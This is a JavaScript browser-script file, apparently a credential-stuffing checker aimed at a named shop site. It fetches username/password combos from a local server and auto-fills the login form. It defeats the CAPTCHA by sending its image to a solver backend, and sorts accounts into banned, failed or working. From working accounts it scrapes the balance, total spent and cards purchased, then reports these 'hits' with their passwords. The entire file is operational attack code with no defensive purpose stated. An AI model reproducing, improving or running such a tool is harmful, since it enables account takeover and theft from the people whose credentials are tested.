(async () => {
  const SERVER = "http://localhost:5050";

  function sleep(ms) {
    return new Promise(res => setTimeout(res, ms));
  }

  function debug(msg) {
    const el = document.getElementById("ext-log") || (() => {
      const box = document.createElement("div");
      box.id = "ext-log";
      box.style = "position:fixed;top:10px;left:10px;background:black;color:lime;padding:5px;z-index:99999;font-size:12px;";
      document.body.appendChild(box);
      return box;
    })();
    el.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
    console.log("[EXT]", msg);
  }

  async function getCreds() {
    try {
      const res = await fetch(`${SERVER}/get-creds`);
      const data = await res.json();
      debug(`Got credentials: ${data.username}`);
      return data;
    } catch (e) {
      console.error("Failed to get creds:", e);
      debug("❌ Failed to get creds");
      return null;
    }
  }

  async function solveCaptchaWithRetry(img, maxRetries = 5) {
    for (let attempt = 0; attempt < maxRetries; attempt++) {
      const solution = await solveCaptcha(img);
      if (solution) return solution;
      debug(`Captcha solve failed [${attempt + 1}/${maxRetries}], retrying...`);
      await sleep(3000);
    }
    debug("❌ CAPTCHA failed after max retries");
    return null;
  }

  async function solveCaptcha(img) {
    if (!img || img.complete === false) {
      debug("❌ Captcha image not ready");
      return null;
    }

    await new Promise(resolve => {
      if (img.complete && img.naturalWidth > 0) return resolve();
      img.onload = resolve;
    });

    const canvas = document.createElement("canvas");
    canvas.width = img.naturalWidth;
    canvas.height = img.naturalHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(img, 0, 0);
    const base64 = canvas.toDataURL("image/jpeg");

    try {
      debug("Sending captcha to backend...");
      const res = await fetch(`${SERVER}/solve-captcha`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: base64 })
      });
      const json = await res.json();
      debug("Captcha solved: " + json.result);
      return json.result || null;
    } catch (e) {
      console.error("Captcha solve error:", e);
      debug("❌ Solve request failed");
      return null;
    }
  }

  async function reportHit(creds, balance, totalSpent = "0", cardsPurchased = "0") {
    debug(`Reporting hit: ${creds.username} | ${balance} | ${totalSpent} | ${cardsPurchased}`);
    
    // Calculate combo check and total captures
    const comboCheck = `${creds.username}:${creds.password}`;
    const totalCaptures = parseInt(totalSpent) + parseInt(cardsPurchased);
    
    await fetch(`${SERVER}/report-hit`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: creds.username,
        password: creds.password,
        balance,
        totalSpent,
        cardsPurchased,
        comboCheck,
        totalCaptures
      })
    });
  }

  async function reportFail(creds, reason) {
    debug(`Reporting fail: ${creds.username} | ${reason}`);
    await fetch(`${SERVER}/report-fail`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: creds.username,
        password: creds.password,
        reason
      })
    });
  }

  async function reportBanned(creds) {
    debug(`Reporting banned: ${creds.username}`);
    await fetch(`${SERVER}/report-banned`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: creds.username,
        password: creds.password
      })
    });
  }

  function waitFor(selector, timeout = 10000) {
    return new Promise((resolve, reject) => {
      const interval = 100;
      let elapsed = 0;
      const timer = setInterval(() => {
        const el = document.querySelector(selector);
        if (el) {
          clearInterval(timer);
          resolve(el);
        } else if ((elapsed += interval) >= timeout) {
          clearInterval(timer);
          reject("Timeout waiting for: " + selector);
        }
      }, interval);
    });
  }

  // Check for error messages on the page
  function checkForErrors() {
    const pageText = document.body.innerText;
    
    // Check for BANNED response
    if (pageText.includes("BANNED") || pageText.includes("banned") || pageText.includes("Banned")) {
      return "BANNED";
    }
    
    // Check for CAPTCHA wrong
    if (pageText.includes("Your verification code is wrong") || pageText.includes("verification code is incorrect")) {
      return "CAPTCHA_WRONG";
    }
    
    // Check for incorrect credentials
    if (pageText.includes("Incorrect username or password")) {
      return "WRONG_CREDENTIALS";
    }
    
    return null;
  }

  const isLogin = location.pathname === "/login";
  const isNews = location.pathname === "/news";
  const isProfile = location.pathname === "/profile";

  if (isLogin) {
    debug("🔑 Login page detected");

    // Check for errors first
    const error = checkForErrors();
    if (error) {
      const creds = JSON.parse(sessionStorage.getItem("lastCreds") || "{}");
      if (creds.username) {
        if (error === "BANNED") {
          debug("🚫 BANNED account detected!");
          await reportBanned(creds);
          sessionStorage.removeItem("lastCreds");
          sessionStorage.removeItem("captchaRetryCount");
          await sleep(2000);
          location.reload();
          return;
        } else if (error === "CAPTCHA_WRONG") {
          // IMPROVEMENT: Retry with same account for CAPTCHA wrong
          let captchaRetryCount = parseInt(sessionStorage.getItem("captchaRetryCount") || "0");
          const maxCaptchaRetries = 5;
          
          if (captchaRetryCount < maxCaptchaRetries) {
            captchaRetryCount++;
            sessionStorage.setItem("captchaRetryCount", captchaRetryCount.toString());
            debug(`🔄 CAPTCHA wrong, retrying with same account (${captchaRetryCount}/${maxCaptchaRetries})...`);
            await sleep(2000);
            location.reload();
            return;
          } else {
            debug("❌ Max CAPTCHA retries reached, reporting fail");
            await reportFail(creds, "Max CAPTCHA retries reached");
            sessionStorage.removeItem("lastCreds");
            sessionStorage.removeItem("captchaRetryCount");
            await sleep(2000);
            location.reload();
            return;
          }
        } else if (error === "WRONG_CREDENTIALS") {
          debug("❌ Wrong credentials, reporting fail");
          await reportFail(creds, "Incorrect username or password");
          sessionStorage.removeItem("lastCreds");
          sessionStorage.removeItem("captchaRetryCount");
          await sleep(2000);
          location.reload();
          return;
        }
      }
    }

    const creds = await getCreds();
    if (!creds || !creds.username) return;
    sessionStorage.setItem("lastCreds", JSON.stringify(creds));

    try {
      debug("Waiting for input fields...");
      const usernameField = await waitFor("input[name='LoginForm[username]']");
      const passwordField = await waitFor("input[name='LoginForm[password]']");
      const captchaField = await waitFor("input[name='LoginForm[verifyCode]']");
      
      // IMPROVEMENT 1: CAPTCHA image with refresh logic (max 3 times)
      let captchaImg = null;
      let refreshCount = parseInt(sessionStorage.getItem("captchaRefreshCount") || "0");
      const maxRefreshAttempts = 3;
      
      for (let attempt = 0; attempt <= maxRefreshAttempts; attempt++) {
        try {
          captchaImg = await waitFor("img[src*='captcha']", 5000);
          if (captchaImg && captchaImg.src && captchaImg.complete && captchaImg.naturalWidth > 0) {
            debug(`Captcha image found on attempt ${attempt + 1}`);
            break;
          } else {
            throw new Error("Captcha image not properly loaded");
          }
        } catch (e) {
          if (attempt < maxRefreshAttempts) {
            refreshCount++;
            sessionStorage.setItem("captchaRefreshCount", refreshCount.toString());
            debug(`Captcha not found, refreshing page (${refreshCount}/${maxRefreshAttempts})...`);
            await sleep(1000);
            location.reload();
            return; // Exit and let the refreshed page handle it
          } else {
            debug("❌ Max captcha refresh attempts reached, reporting fail");
            await reportFail(creds, "Captcha image not found after max refreshes");
            return;
          }
        }
      }

      debug("Filling form...");
      usernameField.value = creds.username;
      passwordField.value = creds.password;

      const solution = await solveCaptchaWithRetry(captchaImg);
      if (!solution) return;

      captchaField.value = solution;
      await sleep(500);

      let count = parseInt(sessionStorage.getItem("loginCount") || "0");
      count++;
      sessionStorage.setItem("loginCount", count);

      if (count >= 7) {
        debug("🔁 7 logins reached, reloading...");
        sessionStorage.setItem("loginCount", "0");
        location.reload();
      } else {
        debug("Submitting login form...");
        const form = document.querySelector("form");
        form.submit();
      }
    } catch (e) {
      console.error("Form fill error:", e);
      debug("❌ Error in filling login form");
    }
  }

  if (isNews) {
    debug("📄 News page detected - redirecting to profile...");
    await sleep(1500);
    
    // IMPROVEMENT 2: Redirect to profile instead of capturing from news
    debug("Redirecting to profile page for data capture...");
    window.location.href = "https://ultimateshop.vc/profile";
  }

  if (isProfile) {
    debug("👤 Profile page detected - capturing data...");
    await sleep(2000);

    const creds = JSON.parse(sessionStorage.getItem("lastCreds") || "{}");
    if (!creds.username) return;

    // ENHANCED BALANCE CAPTURE from profile page
    try {
      // Get Current Balance
      let balance = "0.00";
      const balanceElements = Array.from(document.querySelectorAll("td")).find(el => 
        el.textContent.trim() === "Current balance:"
      );
      if (balanceElements && balanceElements.nextElementSibling) {
        balance = balanceElements.nextElementSibling.textContent.trim();
      }
      
      // Get Total Spent
      let totalSpent = "0";
      const totalSpentElements = Array.from(document.querySelectorAll("td")).find(el => 
        el.textContent.trim() === "Total spent:"
      );
      if (totalSpentElements && totalSpentElements.nextElementSibling) {
        totalSpent = totalSpentElements.nextElementSibling.textContent.trim().replace(/[^\d.]/g, '') || "0";
      }
      
      // Get Cards Purchased
      let cardsPurchased = "0";
      const cardsElements = Array.from(document.querySelectorAll("td")).find(el => 
        el.textContent.trim() === "Cards purchased:"
      );
      if (cardsElements && cardsElements.nextElementSibling) {
        cardsPurchased = cardsElements.nextElementSibling.textContent.trim().replace(/[^\d]/g, '') || "0";
      }

      debug(`Captured data: Balance: ${balance} | Total Spent: ${totalSpent} | Cards: ${cardsPurchased}`);
      
      if (balance && balance !== "?" && balance !== "0.00") {
        await reportHit(creds, balance, totalSpent, cardsPurchased);
      } else {
        debug("❌ Balance not found or zero, not saving as hit.");
      }
    } catch (e) {
      console.error("Data capture error:", e);
      debug("❌ Error capturing balance data");
    }
    
    await sleep(1500);

    debug("Logging out...");
    window.location.href = "https://ultimateshop.vc/user/logout";
  }
})();